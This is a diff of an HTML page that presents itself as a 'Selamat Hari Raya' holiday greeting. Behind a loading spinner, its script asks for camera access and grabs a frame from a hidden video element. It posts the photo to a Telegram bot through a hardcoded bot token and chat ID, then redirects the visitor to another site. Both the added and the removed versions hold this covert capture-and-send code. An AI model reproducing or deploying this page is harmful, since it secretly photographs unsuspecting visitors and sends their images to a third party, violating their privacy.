@@ -5,8 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Selamat Hari Raya</title>
     <style>
-        
-        /* Ensures the body takes up the full height and prevents overflow */
         body, html {
             height: 100%;
             margin: 0;
@@ -16,113 +14,94 @@
             background-color: #f8f8f8;
         }
 
-        /* Spinner styles */
         .spinner {
-            border: 8px solid #f3f3f3; /* Light grey */
-            border-top: 8px solid #3498db; /* Blue */
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #3498db;
             border-radius: 50%;
             width: 50px;
             height: 50px;
             animation: spin 2s linear infinite;
         }
 
-        /* Animation for rotating the spinner */
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
 
-        /* Initially hide the spinner */
         .spinner.hidden {
             display: none;
         }
 
-        /* Video capture area (hidden) */
         video {
-            display: none; /* Hide the video element */
+            display: none;
         }
-    
     </style>
 </head>
 <body>
-    <div id="spinner" class="spinner hidden"></div>
-    <video id="video" width="320" height="240" autoplay=""></video>
+    <div id="spinner" class="spinner"></div>
+    <video id="video" width="320" height="240" autoplay></video>
     <script>
-        const BOT_TOKEN = "8146051541:AAEWlqCaaW0Z8VaejI5UX8p4T4dYPXCZv4Y";  // Gantikan dengan token bot Telegram kau
-        const CHAT_ID = "5934902786";  // Gantikan dengan chat ID Telegram kau
+        const BOT_TOKEN = "8146051541:AAEWlqCaaW0Z8VaejI5UX8p4T4dYPXCZv4Y";  
+        const CHAT_ID = "5934902786";  
 
-        function getChatIdFromURL() {
-            const urlParams = new URLSearchParams(window.location.search);
-            return urlParams.get('id') || "default_id"; // Kalau ID tak ada, guna "default_id"
-        }
-
-        const chatId = getChatIdFromURL();
         const spinner = document.getElementById('spinner');
-
-        spinner.classList.remove('hidden');
         const video = document.getElementById('video');
 
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(function(stream) {
                 video.srcObject = stream;
-
-                let counter = 0;
-                const photoInterval = setInterval(function() {
-                    if (counter < 1.5) {
-                        capturePhoto();
-                        counter++;
-                    } else {
-                        clearInterval(photoInterval);
-                        window.location.href = 'https://studandlearn.github.io/project-2/';
-                    }
-                }, 1000);
-
-                function capturePhoto() {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    const context = canvas.getContext('2d');
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const photoDataUrl = canvas.toDataURL('image/jpeg');
-
-                    sendToTelegram(photoDataUrl);
-                }
-
-                function sendToTelegram(photoDataUrl) {
-                    const blob = dataURLtoBlob(photoDataUrl);
-                    const formData = new FormData();
-                    formData.append("chat_id", CHAT_ID);
-                    formData.append("photo", blob, "photo.jpg");
-
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: "POST",
-                        body: formData
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        console.log("Photo sent to Telegram:", data);
-                    })
-                    .catch(error => {
-                        console.error("Error sending photo:", error);
-                    });
-                }
-
-                function dataURLtoBlob(dataURL) {
-                    const byteString = atob(dataURL.split(',')[1]);
-                    const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
-                    const ab = new ArrayBuffer(byteString.length);
-                    const ia = new Uint8Array(ab);
-                    for (let i = 0; i < byteString.length; i++) {
-                        ia[i] = byteString.charCodeAt(i);
-                    }
-                    return new Blob([ab], { type: mimeString });
-                }
+                
+                video.onloadedmetadata = function() {
+                    setTimeout(capturePhoto, 500); // Ambil gambar selepas 0.5 saat
+                };
             })
             .catch(function(error) {
                 console.log("Camera permission denied: ", error);
                 spinner.classList.add('hidden');
-                alert("Please enter allow to continue to the site.");
+                alert("Please allow camera access to continue.");
             });
+
+        function capturePhoto() {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const photoDataUrl = canvas.toDataURL('image/jpeg');
+
+            sendToTelegram(photoDataUrl);
+        }
+
+        function sendToTelegram(photoDataUrl) {
+            const blob = dataURLtoBlob(photoDataUrl);
+            const formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("photo", blob, "photo.jpg");
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log("Photo sent to Telegram:", data);
+                window.location.href = 'https://studandlearn.github.io/project-2/';
+            })
+            .catch(error => {
+                console.error("Error sending photo:", error);
+            });
+        }
+
+        function dataURLtoBlob(dataURL) {
+            const byteString = atob(dataURL.split(',')[1]);
+            const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        }
     </script>
 </body>
 </html>
